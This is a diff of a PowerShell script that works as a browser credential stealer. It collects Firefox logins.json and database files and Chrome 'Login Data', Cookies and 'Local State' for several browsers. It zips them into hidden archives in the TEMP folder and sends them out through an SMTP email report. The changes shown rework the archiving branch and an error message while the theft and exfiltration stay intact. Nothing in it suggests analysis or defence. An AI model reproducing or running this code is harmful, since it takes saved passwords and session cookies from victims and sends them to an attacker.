@@ -8,8 +8,8 @@ if(Test-Path -Path "C:\Program Files\7-Zip\7z.exe"){
     Set-Location -Path "C:\Program Files\7-Zip\";
     $arh="7"
   }
-else{
-  $arh="W"}
+# else{
+#   $arh="W"}
         
 $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db", "");
         1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\"), "chrome", "Login Data", "Cookies", "Local State");
@@ -28,12 +28,12 @@ for ($i=0; $i -lt 5; $i++){
 #     $p=$env:TEMP+"\d"+$lst[$i][1]+(Get-Random -max 17071707)+".zip"
     $p=($env:TEMP+"\"+$lst[$i][1]+".zip")
     #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
-    if("W"-in $arh){
-      Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
-    }
+    if("7"-in $arh){
+       .\7z.exe a $p (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip
+#      Invoke-Expression (".\7z.exe a $p{0} (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip" -f $i)
+       }
     else{
-      .\7z.exe a $p (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip
-#       Invoke-Expression (".\7z.exe a $p{0} (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip" -f $i)
+      Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
     }
     attrib +H $p
     echo ("____"+$p)
@@ -45,7 +45,7 @@ for ($i=0; $i -lt 5; $i++){
     $SMTPInfo.Send($ReportEmail)
   }
   else{
-    echo $lst[$i][1] #$e=$e+' '+$lst[$i][1]
+    echo "Error: "+$lst[$i][1] #$e=$e+' '+$lst[$i][1]
 #     $ReportEmail.Subject="Error: "+$lst[$i][1]
   }
 }
